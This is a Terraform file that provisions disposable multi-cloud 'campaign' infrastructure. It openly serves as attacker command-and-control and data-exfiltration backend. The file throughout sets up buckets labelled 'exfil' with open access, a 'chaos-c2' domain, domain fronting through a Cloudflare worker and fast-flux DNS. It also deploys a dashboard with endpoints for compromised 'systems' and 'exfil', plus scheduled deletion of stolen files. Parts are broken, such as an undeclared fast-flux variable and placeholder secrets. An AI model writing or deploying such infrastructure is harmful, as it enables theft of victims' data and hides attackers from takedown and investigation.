# Burner Infrastructure - Terraform Configuration
# Deploys fresh Vercel/AWS/GCP projects per campaign

terraform {
  required_version = ">= 1.5"
  required_providers {
    vercel = {
      source  = "vercel/vercel"
      version = "~> 1.0"
    }
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
    google = {
      source  = "hashicorp/google"
      version = "~> 6.0"
    }
    cloudflare = {
      source  = "cloudflare/cloudflare"
      version = "~> 4.0"
    }
    random = {
      source  = "hashicorp/random"
      version = "~> 3.0"
    }
    tls = {
      source  = "hashicorp/tls"
      version = "~> 4.0"
    }
  }
}

# Variables
variable "campaign_name" {
  description = "Campaign identifier"
  type        = string
}

variable "campaign_id" {
  description = "Unique campaign ID"
  type        = string
}

variable "vercel_token" {
  description = "Vercel API token"
  type        = string
  sensitive   = true
}

variable "aws_region" {
  description = "AWS region for resources"
  type        = string
  default     = "us-east-1"
}

variable "gcp_project" {
  description = "GCP project ID"
  type        = string
}

variable "cloudflare_token" {
  description = "Cloudflare API token"
  type        = string
  sensitive   = true
}

variable "cloudflare_zone_id" {
  description = "Cloudflare zone ID"
  type        = string
}

variable "notification_webhook" {
  description = "Webhook URL for deployment notifications"
  type        = string
  default     = ""
}

# Random suffix for unique naming
resource "random_id" "suffix" {
  byte_length = 4
}

# Local values
locals {
  project_name = "chaos-${var.campaign_id}-${random_id.suffix.hex}"
  vercel_project_name = "chaos-${var.campaign_id}-${random_id.suffix.hex}"
  s3_bucket_name = "chaos-exfil-${var.campaign_id}-${random_id.suffix.hex}"
  kv_namespace = "chaos-${var.campaign_id}-${random_id.suffix.hex}"
}

# =============================================================================
# VERCEL DEPLOYMENT
# =============================================================================

provider "vercel" {
  token = var.vercel_token
}

resource "vercel_project" "dashboard" {
  name         = local.vercel_project_name
  framework    = "nextjs"
  git_repository = {
    repo_id = "your-github-repo-id"
  }
  build_command = "npm run build"
  output_directory = ".next"
  dev_command = "npm run dev"
  install_command = "npm install"
  root_directory = "vercel-dashboard"
}

resource "vercel_env_var" "master_key" {
  project_id = vercel_project.dashboard.id
  key        = "MASTER_API_KEY"
  value      = "sk_${var.campaign_id}_${random_id.suffix.hex}"
  target     = ["production", "preview", "development"]
  type       = "encrypted"
}

resource "vercel_env_var" "kv_url" {
  project_id = vercel_project.dashboard.id
  key        = "KV_REST_API_URL"
  value      = "https://${local.kv_namespace}.kv.vercel-storage.com"
  target     = ["production", "preview", "development"]
  type       = "plain"
}

resource "vercel_env_var" "kv_token" {
  project_id = vercel_project.dashboard.id
  key        = "KV_REST_API_TOKEN"
  value      = "auto-generated"  # Would be set after KV creation
  target     = ["production", "preview", "development"]
  type       = "encrypted"
}

resource "vercel_env_var" "external_storage" {
  project_id = vercel_project.dashboard.id
  key        = "EXTERNAL_STORAGE_PROVIDER"
  value      = "r2"
  target     = ["production", "preview", "development"]
  type       = "plain"
}

resource "vercel_env_var" "r2_config" {
  project_id = vercel_project.dashboard.id
  key        = "R2_ACCOUNT_ID"
  value      = "auto-generated"
  target     = ["production", "preview", "development"]
  type       = "encrypted"
}

# Vercel KV Database
resource "vercel_kv_database" "main" {
  name = local.kv_namespace
  # Note: Vercel KV creation via Terraform may require manual setup
}

# Vercel Blob Storage (alternative to R2)
resource "vercel_blob_store" "exfil" {
  name = "${local.project_name}-exfil"
}

# Vercel Domain (optional)
resource "vercel_domain" "custom" {
  project_id = vercel_project.dashboard.id
  name       = "${var.campaign_id}.chaos-c2.example.com"
  # Requires domain verification
}

# =============================================================================
# AWS INFRASTRUCTURE (S3/R2 compatible)
# =============================================================================

provider "aws" {
  region = var.aws_region
}

# S3 Bucket for exfiltration (with R2-compatible API)
resource "aws_s3_bucket" "exfil" {
  bucket = local.s3_bucket_name
  
  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "AES256"
      }
    }
  }

  versioning {
    enabled = true
  }

  lifecycle_rule {
    enabled = true
    expiration {
      days = 30
    }
    noncurrent_version_expiration {
      noncurrent_days = 30
    }
  }

  cors_rule {
    allowed_headers = ["*"]
    allowed_methods = ["GET", "PUT", "POST", "HEAD", "DELETE"]
    allowed_origins = ["*"]
    max_age = 3600
  }
}

resource "aws_s3_bucket_policy" "exfil" {
  bucket = aws_s3_bucket.exfil.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid       = "AllowCampaignAccess"
        Effect    = "Allow"
        Principal = "*"
        Action    = ["s3:PutObject", "s3:GetObject", "s3:DeleteObject"]
        Resource  = "${aws_s3_bucket.exfil.arn}/*"
        Condition = {
          StringEquals = {
            "aws:userid" = "campaign:${var.campaign_id}"
          }
        }
      }
    ]
  })
}

# IAM User for campaign-specific access
resource "aws_iam_user" "campaign" {
  name = "chaos-${var.campaign_id}-${random_id.suffix.hex}"
  path = "/chaos/"
}

resource "aws_iam_access_key" "campaign" {
  user = aws_iam_user.campaign.name
}

resource "aws_iam_user_policy" "campaign_s3" {
  name = "campaign-s3-access"
  user = aws_iam_user.campaign.name
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "s3:PutObject",
          "s3:GetObject",
          "s3:DeleteObject",
          "s3:ListBucket",
        ]
        Resource = [
          aws_s3_bucket.exfil.arn,
          "${aws_s3_bucket.exfil.arn}/*",
        ]
      }
    ]
  })
}

# Lambda for automated cleanup
resource "aws_lambda_function" "cleanup" {
  function_name = "chaos-cleanup-${var.campaign_id}-${random_id.suffix.hex}"
  runtime       = "python3.11"
  handler       = "index.handler"
  role          = aws_iam_role.lambda.arn
  timeout       = 300
  
  filename = data.archive_file.lambda.output_path
  source_code_hash = data.archive_file.lambda.output_base64sha256
}

data "archive_file" "lambda" {
  type        = "zip"
  output_path = "${path.module}/lambda_cleanup.zip"
  source {
    content  = file("${path.module}/lambda/cleanup.py")
    filename = "cleanup.py"
  }
}

resource "aws_iam_role" "lambda" {
  name = "chaos-lambda-${var.campaign_id}-${random_id.suffix.hex}"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = {
        Service = "lambda.amazonaws.com"
      }
    }]
  })
}

resource "aws_iam_role_policy_attachment" "lambda_basic" {
  role       = aws_iam_role.lambda.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
}

resource "aws_iam_role_policy" "lambda_s3" {
  role = aws_iam_role.lambda.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Action = ["s3:ListBucket", "s3:DeleteObject"]
      Resource = [
        aws_s3_bucket.exfil.arn,
        "${aws_s3_bucket.exfil.arn}/*",
      ]
    }]
  })
}

# CloudWatch Event Rule for daily cleanup
resource "aws_cloudwatch_event_rule" "daily_cleanup" {
  name                = "chaos-daily-cleanup-${var.campaign_id}"
  description         = "Daily cleanup of old exfiltration files"
  schedule_expression = "cron(0 2 * * ? *)"
}

resource "aws_cloudwatch_event_target" "lambda_cleanup" {
  rule      = aws_cloudwatch_event_rule.daily_cleanup.name
  target_id = "lambda-cleanup"
  arn       = aws_lambda_function.cleanup.arn
}

resource "aws_lambda_permission" "allow_cloudwatch" {
  statement_id  = "AllowExecutionFromCloudWatch"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.cleanup.function_name
  principal     = "events.amazonaws.com"
  source_arn    = aws_cloudwatch_event_rule.daily_cleanup.arn
}

# =============================================================================
# GCP INFRASTRUCTURE (Alternative)
# =============================================================================

provider "google" {
  project = var.gcp_project
  region  = "us-central1"
}

resource "google_storage_bucket" "exfil" {
  name          = "${local.s3_bucket_name}-gcp"
  location      = "US"
  force_destroy = true
  
  versioning {
    enabled = true
  }
  
  lifecycle_rule {
    condition {
      age = 30
    }
    action {
      type = "Delete"
    }
  }
  
  cors {
    origin          = ["*"]
    method          = ["GET", "PUT", "POST", "HEAD", "DELETE"]
    response_header = ["*"]
    max_age_seconds = 3600
  }
}

resource "google_service_account" "campaign" {
  account_id   = "chaos-${var.campaign_id}-${random_id.suffix.hex}"
  display_name = "Chaos Campaign Service Account"
}

resource "google_service_account_key" "campaign" {
  service_account_id = google_service_account.campaign.name
  public_key_type    = "TYPE_X509_PEM_FILE"
}

resource "google_storage_bucket_iam_member" "campaign_writer" {
  bucket = google_storage_bucket.exfil.name
  role   = "roles/storage.objectCreator"
  member = "serviceAccount:${google_service_account.campaign.email}"
}

resource "google_storage_bucket_iam_member" "campaign_reader" {
  bucket = google_storage_bucket.exfil.name
  role   = "roles/storage.objectViewer"
  member = "serviceAccount:${google_service_account.campaign.email}"
}

# Cloud Function for cleanup
resource "google_cloudfunctions2_function" "cleanup" {
  name        = "chaos-cleanup-${var.campaign_id}"
  location    = "us-central1"
  description = "Daily cleanup of old exfiltration files"
  
  build_config {
    runtime     = "python311"
    entry_point = "cleanup"
    source {
      storage_source {
        bucket = google_storage_bucket.exfil.name
        object = "source/cleanup.zip"
      }
    }
  }
  
  service_config {
    max_instance_count = 1
    available_memory   = "256M"
    timeout_seconds    = 300
    service_account_email = google_service_account.campaign.email
  }
}

# Cloud Scheduler for daily cleanup
resource "google_cloud_scheduler_job" "daily_cleanup" {
  name             = "chaos-daily-cleanup-${var.campaign_id}"
  description      = "Daily cleanup trigger"
  schedule         = "0 2 * * *"
  time_zone        = "UTC"
  attempt_deadline = "300s"
  
  http_target {
    uri         = "https://${var.gcp_project}.cloudfunctions.net/chaos-cleanup-${var.campaign_id}"
    http_method = "POST"
    oauth_token {
      service_account_email = google_service_account.campaign.email
    }
  }
}

# =============================================================================
# CLOUDFLARE (Domain Fronting / DNS)
# =============================================================================

provider "cloudflare" {
  api_token = var.cloudflare_token
}

resource "cloudflare_worker_script" "domain_front" {
  name   = "chaos-df-${var.campaign_id}-${random_id.suffix.hex}"
  content = file("${path.module}/workers/domain_front.js")
  module = false
}

resource "cloudflare_worker_route" "domain_front" {
  zone_id = var.cloudflare_zone_id
  pattern = "${var.campaign_id}.example.com/*"
  script_name = cloudflare_worker_script.domain_front.name
}

resource "cloudflare_record" "front_domain" {
  zone_id = var.cloudflare_zone_id
  name    = var.campaign_id
  type    = "CNAME"
  value   = "${cloudflare_worker_script.domain_front.name}.workers.dev"
  proxied = true
  ttl     = 1
}

# Fast Flux DNS records
resource "cloudflare_record" "fast_flux" {
  for_each = { for idx, domain in var.fast_flux_domains : idx => domain }
  
  zone_id = var.cloudflare_zone_id
  name    = each.value.subdomain
  type    = "A"
  value   = each.value.ip
  ttl     = 300
  proxied = false
}

# =============================================================================
# MONITORING & ALERTING
# =============================================================================

# AWS CloudWatch Dashboard
resource "aws_cloudwatch_dashboard" "campaign" {
  dashboard_name = "chaos-${var.campaign_id}"
  dashboard_body = jsonencode({
    widgets = [
      {
        type   = "metric"
        x      = 0
        y      = 0
        width  = 12
        height = 6
        properties = {
          metrics = [
            ["AWS/S3", "BucketSizeBytes", "BucketName", aws_s3_bucket.exfil.bucket, "StorageType", "StandardStorage"],
            [".", "NumberOfObjects", ".", ".", ".", "AllStorageTypes"],
          ]
          period = 86400
          stat   = "Average"
          region = var.aws_region
          title  = "Exfiltration Storage"
        }
      },
      {
        type   = "metric"
        x      = 12
        y      = 0
        width  = 12
        height = 6
        properties = {
          metrics = [
            ["AWS/Lambda", "Invocations", "FunctionName", aws_lambda_function.cleanup.function_name],
            [".", "Errors", ".", "."],
            [".", "Duration", ".", "."],
          ]
          period = 3600
          stat   = "Sum"
          region = var.aws_region
          title  = "Cleanup Lambda"
        }
      },
    ]
  })
}

# =============================================================================
# OUTPUTS
# =============================================================================

output "campaign_id" {
  value = var.campaign_id
}

output "vercel_project_url" {
  value = "https://${vercel_project.dashboard.name}.vercel.app"
}

output "vercel_dashboard_url" {
  value = "https://${vercel_project.dashboard.name}.vercel.app/dashboard"
}

output "s3_bucket_name" {
  value = aws_s3_bucket.exfil.bucket
}

output "s3_bucket_arn" {
  value = aws_s3_bucket.exfil.arn
}

output "aws_access_key_id" {
  value     = aws_iam_access_key.campaign.id
  sensitive = true
}

output "aws_secret_access_key" {
  value     = aws_iam_access_key.campaign.secret
  sensitive = true
}

output "gcp_service_account_key" {
  value     = base64decode(google_service_account_key.campaign.private_key)
  sensitive = true
}

output "cloudflare_worker_url" {
  value = "https://${cloudflare_worker_script.domain_front.name}.workers.dev"
}

output "front_domain" {
  value = "https://${var.campaign_id}.example.com"
}

output "api_endpoints" {
  value = {
    systems     = "https://${vercel_project.dashboard.name}.vercel.app/api/v2/systems"
    exfil       = "https://${vercel_project.dashboard.name}.vercel.app/api/v2/exfil"
    campaigns   = "https://${vercel_project.dashboard.name}.vercel.app/api/v2/campaigns"
    stats       = "https://${vercel_project.dashboard.name}.vercel.app/api/v2/stats"
    telemetry   = "https://${vercel_project.dashboard.name}.vercel.app/api/v2/telemetry"
  }
}

output "deployment_info" {
  value = {
    campaign_id      = var.campaign_id
    project_name     = local.project_name
    deployed_at      = timestamp()
    terraform_version = terraform.version
    provider_versions = {
      vercel  = "1.0"
      aws     = "5.0"
      google  = "6.0"
      cloudflare = "4.0"
    }
  }
}